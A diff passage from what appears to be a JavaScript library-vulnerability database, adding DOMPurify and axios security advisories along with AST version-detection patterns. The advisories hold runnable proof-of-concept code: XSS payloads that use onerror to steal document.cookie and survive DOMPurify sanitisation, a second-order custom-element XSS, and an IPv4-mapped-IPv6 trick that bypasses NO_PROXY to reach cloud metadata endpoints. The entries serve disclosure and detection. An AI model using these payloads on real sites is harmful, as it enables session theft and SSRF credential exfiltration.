clone(ALLOWED_ATTR);\n  }\n  if (ALLOWED_TAGS === DEFAULT_ALLOWED_TAGS || ALLOWED_TAGS === currentSetConfigTags) {\n    ALLOWED_TAGS = clone(ALLOWED_TAGS);\n  }\n}\n```\n\n(Equivalently: in the hook-event builder at line ~2088, hand the hook a shallow clone of `ALLOWED_ATTR`/`ALLOWED_TAGS` whenever `SET_CONFIG` is true, mirroring the 3.4.7 intent.)\n\nA regression test should reproduce PoC 1 and assert the attacker call returns `<img src=\"x\">`. Note the existing 3.4.7 regression test (\"unguarded attribute hook does not poison subsequent default-config calls\") never exercises `setConfig()` \u2014 adding a `setConfig` variant closes the gap.\n\n**Application-side mitigation until patched:** prefer `data.keepAttr = true` (per-element, non-persistent) over `data.allowedAttributes[name] = true` inside hooks; or call `DOMPurify.clearConfig()` between trust domains; or use separate DOMPurify instances for trusted vs. untrusted content.\n\n---\n\n## Limitations\n\n- Requires the two-part precondition above (persistent `setConfig()` **and** a hook writing `data.allowedAttributes[...]`). Not a default-config bypass.\n- Impact is bounded by `clearConfig()`, which restores a clean state. The earlier-considered \"survives `clearConfig()`\" claim did **not** reproduce and is withdrawn.\n- A position could be adopted to \"use `data.keepAttr=true`, not `allowedAttributes[]`.\" However, the 3.4.7 security fix exists precisely to defend the `allowedAttributes[]` hook pattern in the per-call path; leaving the `setConfig` path unguarded is an incomplete fix of an acknowledged security issue.\n\n## Validation\n\n- **Integrity:** the tested `dompurify@3.4.10` `dist/purify.cjs.js` (md5 `ab0e7b1cde1cbcace0f62b6aac284143`) and browser `dist/purify.min.js` (md5 `b0985f80fa48e6e7b263f8f6a64b779e`) are byte-identical to a freshly `npm pack`-ed release \u2014 the repro is on the real shipped code. Mechanism identical on 3.4.0, 3.4.9 and 3.4.10.\n- **Node (mechanism):** PoCs 1\u20133 reproduce deterministically; `DOMPurify.isValidAttribute('img','onerror','x')` flips `false \u2192 true` after a single trusted render under `setConfig()`, proving the shared attribute gate is poisoned. Leak survives `removeAllHooks()`, is cross-element, persists for the instance lifetime, and is reset only by `clearConfig()`.\n- **Real browser (impact):** in Chrome with DOMPurify 3.4.10, assigning the attacker output to `innerHTML` **executes** the surviving `onerror` (sentinel `window.__fired = [\"ATTACKER-onerror\"]`; `onerror` DOM property is a `function`), with no user interaction. The no-`setConfig` A/B control does not fire \u2014 execution is attributable to the `setConfig` leak, not a harness artifact.\n\n---\n\n## Appendix A \u2014 Node PoC (complete, runnable)\n\n```js\n// poc.js  \u2014  npm i dompurify@3.4.10 jsdom  &&  node poc.js\nconst createDOMPurify = require('dompurify');\nconst { JSDOM } = require('jsdom');\nconst freshDP = () => createDOMPurify(new JSDOM('').window);\nconst log = (s) => console.log(s);\nlog('DOMPurify ' + freshDP().version + '\\n');\n\n// PoC 1 \u2014 the leak: trusted render permanently allows onerror on attacker content\n{\n  const DP = freshDP();\n  DP.setConfig({ ALLOWED_TAGS: ['img'], ALLOWED_ATTR: ['src'] });\n  DP.addHook('uponSanitizeAttribute', (node, data) => {\n    if (node.getAttribute && node.getAttribute('data-trusted') === '1') {\n      data.allowedAttributes['onerror'] = true;            // intended: trusted-only\n    }\n  });\n  DP.sanitize('<img data-trusted=\"1\" src=\"x\" onerror=\"loadWidget()\">');            // trusted render\n  const attacker = DP.sanitize('<img src=\"x\" onerror=\"alert(document.cookie)\">');  // attacker, no data-trusted\n  log('[PoC1] attacker output  : ' + attacker);\n  log('[PoC1] onerror survived : ' + /onerror/.test(attacker));\n  log('[PoC1] isValidAttribute(img,onerror) -> ' + DP.isValidAttribute('img','onerror','x') + '  (shared gate poisoned)\\n');\n}\n\n// PoC 2 \u2014 attribute-agnostic: a DOMPurify state-leak, not \"the app allowed on*\"\n{\n  const DP = freshDP();\n  DP.setConfig({ ALLOWED_TAGS: ['span'], ALLOWED_ATTR: [] });\n  DP.addHook('uponSanitizeAttribute', (n, d) => {\n    if (n.getAttribute && n.getAttribute('data-trusted') === '1') d.allowedAttributes['title'] = true;\n  });\n  DP.sanitize('<span data-trusted=\"1\" title=\"ok\">x</span>');\n  log('[PoC2] benign title leaks: ' + DP.sanitize('<span title=\"leaked\">x</span>') + '\\n');\n}\n\n// PoC 3 \u2014 control: WITHOUT setConfig the 3.4.7 guard holds\n{\n  const DP = freshDP();\n  DP.addHook('uponSanitizeAttribute', (n, d) => {\n    if (n.getAttribute && n.getAttribute('data-trusted') === '1') d.allowedAttributes['onerror'] = true;\n  });\n  DP.sanitize('<img data-trusted=\"1\" src=\"x\" onerror=\"ok()\">', { ALLOWED_TAGS:['img'], ALLOWED_ATTR:['src'] });\n  const ctrl = DP.sanitize('<img src=\"x\" onerror=\"alert(1)\">', { ALLOWED_TAGS:['img'], ALLOWED_ATTR:['src'] });\n  log('[PoC3] control output   : ' + ctrl + '   stripped: ' + !/onerror/.test(ctrl) + '\\n');\n}\n\n// Persistence: survives removeAllHooks(); reset only by clearConfig()\n{\n  const DP = freshDP();\n  DP.setConfig({ ALLOWED_TAGS: ['img'], ALLOWED_ATTR: ['src'] });\n  DP.addHook('uponSanitizeAttribute', (n, d) => {\n    if (n.getAttribute && n.getAttribute('data-trusted') === '1') d.allowedAttributes['onerror'] = true;\n  });\n  DP.sanitize('<img data-trusted=\"1\" src=\"x\" onerror=\"ok()\">');\n  DP.removeAllHooks();\n  let leaks = 0;\n  for (let i = 0; i < 5; i++) if (/onerror/.test(DP.sanitize('<img src=\"x\" onerror=\"alert('+i+')\">'))) leaks++;\n  log('[persist] survived ' + leaks + '/5 calls after removeAllHooks()');\n  DP.clearConfig();\n  log('[persist] after clearConfig(): ' + DP.sanitize('<img src=\"x\" onerror=\"alert(1)\">') + '  (reset)');\n}\n```\n\nExpected output:\n```\n[PoC1] attacker output  : <img src=\"x\" onerror=\"alert(document.cookie)\">\n[PoC1] onerror survived : true\n[PoC1] isValidAttribute(img,onerror) -> true  (shared gate poisoned)\n[PoC2] benign title leaks: <span title=\"leaked\">x</span>\n[PoC3] control output   : <img src=\"x\">   stripped: true\n[persist] survived 5/5 calls after removeAllHooks()\n[persist] after clearConfig(): <img src=\"x\">  (reset)\n```\n\n## Appendix B \u2014 Browser PoC (complete; confirms execution)\n\n```html\n<!doctype html><html><head><meta charset=\"utf-8\">\n<script src=\"https://cdn.jsdelivr.net/npm/dompurify@3.4.10/dist/purify.min.js\"><\/script>\n</head><body><pre id=\"out\"></pre>\n<script>\nconst log = (s) => document.getElementById('out').textContent += s + '\\n';\nwindow.__fired = [];\nwindow.alert = (x) => window.__fired.push('alert:' + x);   // sentinel: capture exec, no modal\nlog('DOMPurify ' + DOMPurify.version);\n\n// App init: persistent policy + a hook allowing onerror ONLY for trusted elements\nDOMPurify.setConfig({ ALLOWED_TAGS: ['img'], ALLOWED_ATTR: ['src'] });\nDOMPurify.addHook('uponSanitizeAttribute', (node, data) => {\n  if (node.getAttribute && node.getAttribute('data-trusted') === '1') data.allowedAttributes['onerror'] = true;\n});\n\nDOMPurify.sanitize('<img data-trusted=\"1\" src=\"x\" onerror=\"0\">');                 // one trusted render\nconst out = DOMPurify.sanitize('<img src=\"x\" onerror=\"alert(\\'XSS:\\'+document.domain)\">');  // attacker\nlog('attacker sanitized output: ' + out);\nconst host = document.createElement('div');\nhost.innerHTML = out;                            // surviving onerror arms on the broken-src img\ndocument.body.appendChild(host);\n\nsetTimeout(() => {\n  log('handlers fired: ' + JSON.stringify(window.__fired));\n  log(window.__fired.length ? 'RESULT: XSS EXECUTED' : 'RESULT: no execution');\n}, 500);\n<\/script></body></html>\n```\n\nObserved: `handlers fired: [\"alert:XSS:<domain>\"]` \u2192 **RESULT: XSS EXECUTED** (no user interaction). The same harness without the `setConfig()` line strips `onerror` and does not fire.",
+                info: [
+                  "https://github.com/cure53/DOMPurify/security/advisories/GHSA-cmwh-pvxp-8882"
+                ]
+              },
+              {
+                atOrAbove: "0",
+                below: "3.4.12",
+                severity: "low",
+                cwe: [
+                  "CWE-184",
+                  "CWE-693",
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "DOMPurify: `CUSTOM_ELEMENT_HANDLING` bypasses `afterSanitizeElements` for allowed custom elements.",
+                  githubID: "GHSA-c2j3-45gr-mqc4",
+                  CVE: [
+                    "CVE-2026-66010"
+                  ]
+                },
+                details: '## Summary\n\nThere is a possible hook-policy inconsistency in DOMPurify 3.4.11 involving `CUSTOM_ELEMENT_HANDLING`.\n\nWhen a custom element is allowed via `CUSTOM_ELEMENT_HANDLING.tagNameCheck`, it appears that the element does not go through `afterSanitizeElements` in the same way as a normal element. As a result, an application that relies on `afterSanitizeElements` as a security policy layer to strip sensitive attributes from all elements may see those attributes removed from normal elements but preserved on allowed custom elements.\n\nThis does not appear to be a direct DOMPurify XSS or a case where DOMPurify directly allows executable payloads. The preserved value is still inert at sanitize time. The issue becomes relevant when the allowed custom element later re-injects that attribute value into an HTML sink such as `innerHTML`, creating a second-order XSS gadget.\n\n## Details\n\nThe issue appears to originate from the control flow in `src/purify.ts`: line 1672~1691\n\n```tsx\nconst _sanitizeDisallowedNode = function (\n    currentNode: any,\n    tagName: string\n  ): boolean {\n    /* Check if we have a custom element to handle */\n    if (!FORBID_TAGS[tagName] && _isBasicCustomElement(tagName)) {\n      if (\n        CUSTOM_ELEMENT_HANDLING.tagNameCheck instanceof RegExp &&\n        regExpTest(CUSTOM_ELEMENT_HANDLING.tagNameCheck, tagName)\n      ) {\n        return false;\n      }\n\n      if (\n        CUSTOM_ELEMENT_HANDLING.tagNameCheck instanceof Function &&\n        CUSTOM_ELEMENT_HANDLING.tagNameCheck(tagName)\n      ) {\n        return false;\n      }\n    }\n```\n\n`CUSTOM_ELEMENT_HANDLING` is parsed from user configuration at `src/purify.ts`: line 741~748\n\n```tsx\nconst customElementHandling =\n      objectHasOwnProperty(cfg, \'CUSTOM_ELEMENT_HANDLING\') &&\n      cfg.CUSTOM_ELEMENT_HANDLING &&\n      typeof cfg.CUSTOM_ELEMENT_HANDLING === \'object\'\n        ? clone(cfg.CUSTOM_ELEMENT_HANDLING)\n        : create(null);\n\n    CUSTOM_ELEMENT_HANDLING = create(null);\n```\n\nIn particular, `tagNameCheck`, `attributeNameCheck`, and `allowCustomizedBuiltInElements` are copied into the internal `CUSTOM_ELEMENT_HANDLING` object there.\n\nDuring element sanitization, `_sanitizeElements()` checks whether a node is forbidden or not allowlisted at `src/purify.ts`: line 1805~1814\n\n```tsx\n/* Remove element if anything forbids its presence */\n    if (\n      FORBID_TAGS[tagName] ||\n      (!(\n        EXTRA_ELEMENT_HANDLING.tagCheck instanceof Function &&\n        EXTRA_ELEMENT_HANDLING.tagCheck(tagName)\n      ) &&\n        !ALLOWED_TAGS[tagName])\n    ) {\n      return _sanitizeDisallowedNode(currentNode, tagName);\n    }\n```\n\nIf so, it immediately delegates to `_sanitizeDisallowedNode(currentNode, tagName)` and returns its boolean result.\n\nInside `_sanitizeDisallowedNode()`, the custom-element-specific allow path is implemented at `src/purify.ts`: line 1672~1692\n\n```tsx\nconst _sanitizeDisallowedNode = function (\n    currentNode: any,\n    tagName: string\n  ): boolean {\n    /* Check if we have a custom element to handle */\n    if (!FORBID_TAGS[tagName] && _isBasicCustomElement(tagName)) {\n      if (\n        CUSTOM_ELEMENT_HANDLING.tagNameCheck instanceof RegExp &&\n        regExpTest(CUSTOM_ELEMENT_HANDLING.tagNameCheck, tagName)\n      ) {\n        return false;\n      }\n\n      if (\n        CUSTOM_ELEMENT_HANDLING.tagNameCheck instanceof Function &&\n        CUSTOM_ELEMENT_HANDLING.tagNameCheck(tagName)\n      ) {\n        return false;\n      }\n    }\n```\n\nIf the node is treated as a basic custom element and `CUSTOM_ELEMENT_HANDLING.tagNameCheck` matches, the function returns `false` immediately at line 1682 or 1689, meaning \u201Cdo not remove this node\u201D.\n\nThat early `return false` is significant because control returns directly to `_sanitizeElements()` via the `return _sanitizeDisallowedNode(...)` at line 1813. As a result, the later logic in `_sanitizeElements()` is skipped for that custom element instance, including:\n\n- the namespace validation at `src/purify.ts`: line 1816~1826\n\n```tsx\n* Check whether element has a valid namespace.\n       Realm-safe check (GHSA-hpcv-96wg-7vj8): use the cached Node.prototype\n       nodeType getter rather than `instanceof Element`, which is realm-\n       bound and short-circuits to false for any node minted in a different\n       realm \u2014 letting a foreign-realm element with a forbidden namespace\n       slip past the namespace check entirely. */\n    const nt = getNodeType ? getNodeType(currentNode) : currentNode.nodeType;\n    if (nt === NODE_TYPE.element && !_checkValidNamespace(currentNode)) {\n      _forceRemove(currentNode);\n      return true;\n    }\n```\n\n- the fallback-tag mXSS check at `src/purify.ts`: line 1828~1837\n\n```tsx\n/* Make sure that older browsers don\'t get fallback-tag mXSS */\n    if (\n      (tagName === \'noscript\' ||\n        tagName === \'noembed\' ||\n        tagName === \'noframes\') &&\n      regExpTest(EXPRESSIONS.FALLBACK_TAG_CLOSE, currentNode.innerHTML)\n    ) {\n      _forceRemove(currentNode);\n      return true;\n    }\n```\n\n- most importantly for this report, the `afterSanitizeElements` hook dispatch at `src/purify.ts`: line 1850~1851.\n\n```tsx\n   /* Execute a hook if present */\n    _executeHooks(hooks.afterSanitizeElements, currentNode, null);\n```\n\nIn other words, a normal allowlisted element continues through `_sanitizeElements()` and reaches `hooks.afterSanitizeElements`, but a disallowed-by-default element that is revived by the `CUSTOM_ELEMENT_HANDLING.tagNameCheck` path does not. This creates a policy inconsistency: an application that relies on `afterSanitizeElements` to remove an attribute from all elements will observe that the policy is applied to normal elements but not to custom elements allowed through `CUSTOM_ELEMENT_HANDLING`.\n\nIn the PoC, the application hook removes `data-bio` from ordinary elements, but the same attribute remains on `<x-bio>` because the custom-element keep path bypasses `afterSanitizeElements`. The attribute itself is inert at sanitize time and DOMPurify is not directly allowing executable SVG/HTML through. The security impact appears when the application-defined custom element later reads the preserved `data-bio` value in `connectedCallback()` and writes it to `innerHTML`, turning the preserved attribute into a second-order XSS gadget.\n\n## PoC\n\nReproduced on DOMPurify 3.4.11.\n\n### Steps\n\n1. Save the following HTML to a file, for example `poc.html`.\n2. Open it in a browser.\n3. Observe that the `div` control loses `data-bio`, while the allowed custom element keeps it.\n4. Observe that after `connectedCallback()` runs, the candidate payload is reinserted into the DOM and executes through the custom element\u2019s own sink.\n\n### HTML PoC\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n  <meta charset="UTF-8">\n  <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.4.11/purify.min.js"><\/script>\n</head>\n<body>\n<pre id="result"></pre>\n\n<script>\nwindow.__controlFired = false;\nwindow.__candidateFired = false;\n\ncustomElements.define("x-bio", class extends HTMLElement {\n  connectedCallback() {\n    const bio = this.getAttribute("data-bio");\n    if (bio) this.innerHTML = bio;\n  }\n});\n\nDOMPurify.addHook("afterSanitizeElements", node => {\n  if (node.hasAttribute && node.hasAttribute("data-bio")) {\n    node.removeAttribute("data-bio");\n  }\n});\n\nconst config = {\n  CUSTOM_ELEMENT_HANDLING: {\n    tagNameCheck: /^x-/\n  }\n};\n\nconst controlInput =\n  \'<div data-bio="&lt;img src=x onerror=window.__controlFired=true&gt;"></div>\';\n\nconst candidateInput =\n  \'<x-bio data-bio="&lt;img src=x onerror=window.__candidateFired=true&gt;"></x-bio>\';\n\nconst cleanControl = DOMPurify.sanitize(controlInput, config);\nconst cleanCandidate = DOMPurify.sanitize(candidateInput, config);\n\nconst container = document.createElement("div");\ncontainer.innerHTML = cleanCandidate;\ndocument.body.appendChild(container);\n\nsetTimeout(() => {\n  document.getElementById("result").textContent =\n    "This is not direct DOMPurify XSS.\\n" +\n    "The payload becomes executable only after x-bio writes data-bio into innerHTML.\\n\\n" +\n    "control: " + cleanControl + "\\n" +\n    "candidate: " + cleanCandidate + "\\n" +\n    "after connectedCallback: " + container.innerHTML + "\\n" +\n    "control fired: " + window.__controlFired + "\\n" +\n    "candidate fired: " + window.__candidateFired;\n}, 100);\n<\/script>\n</body>\n</html>\n```\n\n### Expected result\n\n```\ncontrol: <div></div>\ncandidate: <x-bio data-bio="<img src=x onerror=window.__candidateFired=true>"></x-bio>\nafter connectedCallback: <x-bio data-bio="..."><img src="x" onerror="window.__candidateFired=true"></x-bio>\ncontrol fired: false\ncandidate fired: true\n```\n\nThis is output of HTML PoC.\n\n<img width="1917" height="961" alt="poc" src="https://github.com/user-attachments/assets/80e22989-5779-42f8-8ffb-106e9a4c2b10" />\n\n\n## Impact\n\nThis does not appear to affect DOMPurify\u2019s default configuration as a direct sanitizer bypass.\n\nThe impact is limited to applications that:\n\n- enable `CUSTOM_ELEMENT_HANDLING`,\n- rely on `afterSanitizeElements` as a security policy layer,\n- expect that hook to apply uniformly to all surviving elements,\n- and have allowed custom elements that later re-inject preserved attribute values into `innerHTML` or another HTML sink.\n\nIn that situation, the behavior can become a second-order XSS gadget because a security-relevant attribute is removed from normal elements but remains on allowed custom elements.\n\nPossible fixes or mitigations might include\n\n- ensuring that allowed custom elements also consistently pass through `afterSanitizeElements`\n- documenting clearly that elements preserved via `CUSTOM_ELEMENT_HANDLING` may not participate in the same post-element hook flow as normal allowlisted elements.',
+                info: [
+                  "https://github.com/cure53/DOMPurify/security/advisories/GHSA-c2j3-45gr-mqc4",
+                  "https://github.com/cure53/DOMPurify/pull/1537",
+                  "https://github.com/cure53/DOMPurify/commit/a9ca1e537422319a557a9a2aa61f003b23b4a197",
+                  "https://github.com/cure53/DOMPurify/releases/tag/3.4.12"
+                ]
               }
             ],
             extractors: {
@@ -16506,7 +17772,7 @@ Reporter: Koda Reef`,
               ],
               hashes: {},
               ast: [
-                '//CallExpression[       /:callee//:left/:property/:name == "DOMPurify"     ]/:arguments//AssignmentExpression[       /:left/:property/:name == "version"     ]/:right/:value',
+                '//CallExpression[       /:callee//AssignmentExpression[/:left/:property/:name == "DOMPurify"]     ]/:arguments//AssignmentExpression[       /:left/:property/:name == "version"     ]/:right/:value',
                 '//IfStatement[       /:test//AssignmentExpression[/:left/:property/:name == "removed"]/:left/$:object ==       /:consequent//AssignmentExpression[/:left/:property/:name == "isSupported"]/:left/$:object     ]/:test//AssignmentExpression[/:left/:property/:name == "version"]/$$:right/:value'
               ]
             }
@@ -16678,7 +17944,10 @@ Reporter: Koda Reef`,
               ast: [
                 '//CallExpression[       /FunctionExpression//MemberExpression/:property/:name == "React"     ]/FunctionExpression/BlockStatement/ExpressionStatement/AssignmentExpression[       /:left/:property/:name == "version"     ]/$$:right/:value',
                 '//BlockStatement[       /ExpressionStatement/AssignmentExpression/MemberExpression[/:property/:name == "__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED"]/$:object ==       /ExpressionStatement/AssignmentExpression/MemberExpression[/:property/:name == "version"]/$:object     ]/ExpressionStatement/AssignmentExpression[/MemberExpression/:property/:name == "version"]/$$:right/:value',
-                '/ExpressionStatement/AssignmentExpression[         /MemberExpression/:property/:name == "version" &&         /MemberExpression/:$object ==          ../../ExpressionStatement/AssignmentExpression/MemberExpression[           /:property/:name == "__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED"         ]/$:object     ]/$$:right/:value'
+                '/ExpressionStatement/AssignmentExpression[         /MemberExpression/:property/:name == "version" &&         /MemberExpression/:$object ==         ../../ExpressionStatement/AssignmentExpression/MemberExpression[           /:property/:name == "__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED"         ]/$:object     ]/$$:right/:value',
+                '//SequenceExpression[       /AssignmentExpression/:left[/:object/:name == "exports" && /:property/:name == "__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE"]     ]/AssignmentExpression[       /:left/:object/:name == "exports" && /:left/:property/:name == "version"     ]/:right/:value',
+                '//SequenceExpression[       /AssignmentExpression[/:left/:property/:name == "__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE"]/:left/$:object ==       /AssignmentExpression[/:left/:property/:name == "version"]/:left/$:object     ]/AssignmentExpression[       /:left/:property/:name == "version"     ]/$$:right/:value',
+                '/ExpressionStatement/AssignmentExpression[       /MemberExpression/:property/:name == "version" &&       /MemberExpression/:object/:name == "exports" &&       ../../ExpressionStatement/AssignmentExpression/MemberExpression[         /:property/:name == "__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE" &&         /:object/:name == "exports"       ]     ]/$$:right/:value'
               ]
             }
           },
@@ -16802,7 +18071,8 @@ Reporter: Koda Reef`,
                 '//ObjectExpression/Property[/:key/:name == "reconcilerVersion"]/$$:value/:value',
                 '//ObjectExpression[       /Property[/:key/:name == "rendererPackageName" && /:value/:value == "react-dom"]     ]/Property[/:key/:name == "version"]/:value/:value',
                 '//SequenceExpression[             /AssignmentExpression/:left[/:object/:name == "exports" && /:property/:name == "__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE"]          ]/AssignmentExpression[             /:left/:object/:name == "exports" && /:left/:property/:name == "version"         ]/:right/:value',
-                '/ExpressionStatement/AssignmentExpression[   /MemberExpression/:property/:name == "version" &&   /MemberExpression     [/:$object ==          ../../../ExpressionStatement/AssignmentExpression/MemberExpression[           /:property/:name == "__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE"         ]/$:object ||       /Identifier[         /:name == "exports" && ../../../../ExpressionStatement/AssignmentExpression/MemberExpression[           /:property/:name == "__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE"         ]/Identifier/:name == "exports"       ]     ]     ]/$$:right/:value'
+                '/ExpressionStatement/AssignmentExpression[   /MemberExpression/:property/:name == "version" &&   /MemberExpression     [/:$object ==          ../../../ExpressionStatement/AssignmentExpression/MemberExpression[           /:property/:name == "__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE"         ]/$:object ||       /Identifier[         /:name == "exports" && ../../../../ExpressionStatement/AssignmentExpression/MemberExpression[           /:property/:name == "__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE"         ]/Identifier/:name == "exports"       ]     ]     ]/$$:right/:value',
+                '//SequenceExpression[       /AssignmentExpression[/:left/:property/:name == "__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE"]/:left/$:object ==       /AssignmentExpression[/:left/:property/:name == "version"]/:left/$:object     ]/AssignmentExpression[       /:left/:property/:name == "version"     ]/$$:right/:value'
               ]
             }
           },
@@ -17981,7 +19251,7 @@ Reporter: Koda Reef`,
               ],
               ast: [
                 '//VariableDeclarator[       /:id/:name == "Vue"     ]/CallExpression/FunctionExpression/BlockStatement/ReturnStatement/SequenceExpression/AssignmentExpression[       /:left/:property/:name == "version"     ]/$:right/:init/:value     ',
-                '//CallExpression[       /:callee//:left/:property/:name == "Vue"     ]/:arguments//AssignmentExpression[       /:left/:property/:name == "version"     ]/$$:right/:value',
+                '//CallExpression[       /:callee//AssignmentExpression[/:left/:property/:name == "Vue"]     ]/:arguments//AssignmentExpression[       /:left/:property/:name == "version"     ]/$$:right/:value',
                 '//AssignmentExpression[       /:left/:object/:name == "Vue" &&       /:left/:property/:name == "version"     ]/:right/:value'
               ]
             }
@@ -18959,6 +20229,7 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
                 below: "0.32.0",
                 severity: "high",
                 cwe: [
+                  "CWE-289",
                   "CWE-918"
                 ],
                 identifiers: {
@@ -18971,6 +20242,185 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
                 details: "### Summary\nshouldBypassProxy, introduced in v1.15.0 to fix CVE-2025-62718, does not normalise IPv4-mapped IPv6 addresses. When NO_PROXY lists an IPv4 address such as `127.0.0.1` or `169.254.169.254`, a request URL using the IPv4-mapped IPv6 form (`::ffff:7f00:1`, `::ffff:a9fe:a9fe`) still routes through the configured proxy. Node.js resolves these addresses to the underlying IPv4 host, so the request reaches the internal service via the proxy rather than being blocked.\n\n### Details\nlib/helpers/shouldBypassProxy.js (v1.15.0):                                                                                                                                   \n\n```javascript                                                                                                                                                                              \n  const LOOPBACK_ADDRESSES = new Set(['localhost', '127.0.0.1', '::1']);                                                                                                      \n  const isLoopback = (host) => LOOPBACK_ADDRESSES.has(host);                                                                                                                    \n                                                                                                                                                                                \n  // normalizeNoProxyHost strips brackets and trailing dots, but not ::ffff: prefix                                                                                             \n  return hostname === entryHost || (isLoopback(hostname) && isLoopback(entryHost));                                                                                             \n```\n                                                                                                                                                                                \nThe WHATWG URL parser canonicalises `http://[::ffff:127.0.0.1]/` to hostname `[::ffff:7f00:1]`. After bracket-stripping: `::ffff:7f00:1`. This string does not match 127.0.0.1 in NO_PROXY and is not in LOOPBACK_ADDRESSES, so shouldBypassProxy returns false and the proxy is used.  proxy-from-env (called before shouldBypassProxy) has the same gap - it does not equate ::ffff:7f00:1 with 127.0.0.1 - so neither layer catches the bypass.\n\n### PoC\n```javascript\n\n// NO_PROXY=127.0.0.1,localhost,::1  HTTP_PROXY=http://attacker:8080\nimport shouldBypassProxy from 'axios/lib/helpers/shouldBypassProxy.js';                                                                                                       \n                                                                                                                                                                              \n// All three should return true (bypass proxy). Only the first two do.                                                                                                        \nconsole.log(shouldBypassProxy('http://127.0.0.1/'));          // true  [OK]                                                                                                     \nconsole.log(shouldBypassProxy('http://[::1]/'));               // true  [OK]                                                                                                     \nconsole.log(shouldBypassProxy('http://[::ffff:127.0.0.1]/')); // false <- bypass                                                                                             \nconsole.log(shouldBypassProxy('http://[::ffff:7f00:1]/'));     // false <- bypass\n\n```                                                                                              \n                                                                                                                                                                              \nNode.js routes ::ffff:7f00:1 to 127.0.0.1:                                                                                                                                    \n\n```                                                                                                                                                                              \n// net.connect({ host: '::ffff:7f00:1', port: 80 }) reaches a service                                                                                                       \n// bound to 127.0.0.1:80 \u2014 confirmed on Node.js v24, Linux and macOS.                                                                                                         \n```                                                                                                                                                                              \nCloud metadata SSRF: ::ffff:a9fe:a9fe = ::ffff:169.254.169.254. If NO_PROXY=169.254.169.254 is set to block IMDS access, a request to http://[::ffff:a9fe:a9fe]/latest/meta-data/ bypasses it.                                                                                                                      \n                                                                                                                                                                            \n#### Fix                                                                                                                                                                           \n                                                                                                                                                                            \nCanonicalise IPv4-mapped IPv6 in normalizeNoProxyHost before any comparison:                                                                                                  \n \n ```javascript                                                                                                                                                                           \nconst ipv4MappedDotted = /^::ffff:(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})$/i;                                                                                                    \nconst ipv4MappedHex    = /^::ffff:([0-9a-f]{1,4}):([0-9a-f]{1,4})$/i;                                                                                                         \n                                                                                                                                                                              \nfunction hexToIPv4(a, b) {                                                                                                                                                    \n  const hi = parseInt(a, 16), lo = parseInt(b, 16);                                                                                                                           \n  return `${hi >> 8}.${hi & 0xff}.${lo >> 8}.${lo & 0xff}`;                                                                                                                   \n}                                                                                                                                                                             \n                                                                                                                                                                              \nconst normalizeNoProxyHost = (hostname) => {                                                                                                                                  \n  if (!hostname) return hostname;                                                                                                                                           \n  if (hostname[0] === '[' && hostname.at(-1) === ']')\n    hostname = hostname.slice(1, -1);                                                                                                                                         \n  hostname = hostname.replace(/\\.+$/, '').toLowerCase();\n                                                                                                                                                                              \n  let m;                                                                                                                                                                    \n  if ((m = hostname.match(ipv4MappedDotted))) return m[1];                                                                                                                    \n  if ((m = hostname.match(ipv4MappedHex)))    return hexToIPv4(m[1], m[2]);                                                                                                   \n  return hostname;                                                                                                                                                            \n};\n\n```\n\n### Impact\nAny application that sets NO_PROXY to exclude internal or metadata endpoints and uses an HTTP/HTTPS proxy can have those exclusions bypassed by a URL using IPv4-mapped IPv6 notation. The attacker must control the request URL. In cloud environments with instance metadata services, this can lead to credential exfiltration.",
                 info: [
                   "https://github.com/axios/axios/security/advisories/GHSA-pjwm-pj3p-43mv"
+                ]
+              },
+              {
+                atOrAbove: "0.8.0",
+                below: "0.33.0",
+                severity: "medium",
+                cwe: [
+                  "CWE-1321"
+                ],
+                identifiers: {
+                  summary: "Axios: Nested axios option objects can consume polluted prototype values",
+                  githubID: "GHSA-7q8q-rj6j-mhjq",
+                  CVE: [
+                    "CVE-2026-67319"
+                  ]
+                },
+                details: "## Summary\n\nAxios can consume inherited properties from nested request option objects when the JavaScript process already has a polluted `Object.prototype`.\n\nThe top-level merged config is protected with a null prototype, but nested plain objects such as `auth` and `paramsSerializer` are cloned into ordinary objects. If application code passes placeholders such as `auth: {}` or `paramsSerializer: {}`, inherited `username`, `password`, `encode`, or `serialize` properties can influence outbound requests.\n\n## Impact\n\nThis is reachable only when another component has already polluted `Object.prototype` and the application passes an affected nested axios option object.\n\nConfirmed impacts include silent injection of an `Authorization: Basic ...` header from inherited `username` and `password` values, and query-string tampering when inherited `paramsSerializer` fields are function-valued.\n\nThe `auth` case requires only string-valued pollution. Full query-string replacement through `paramsSerializer.serialize` requires a function-valued pollution primitive; string-only pollution may still cause request failures or encoding changes through `encode`.\n\nThis does not mean every axios request is affected. Requests that do not pass `auth`, do not pass `paramsSerializer`, or provide explicit own properties for the relevant nested fields are not affected by this specific gadget.\n\n## Affected Functionality\n\nAffected runtime functionality:\n\n- Node HTTP adapter Basic auth handling in `lib/adapters/http.js`.\n- Browser/fetch/XHR Basic auth handling through `lib/helpers/resolveConfig.js`.\n- Query serialization through `lib/helpers/buildURL.js`.\n- `axios.getUri()` when called with an affected `paramsSerializer` object.\n\nAffected config shapes:\n\n- `auth: {}` or an `auth` object missing own `username` and/or `password`.\n- `paramsSerializer: {}` or a `paramsSerializer` object missing own `encode` and/or `serialize`.\n\nUnaffected by this specific 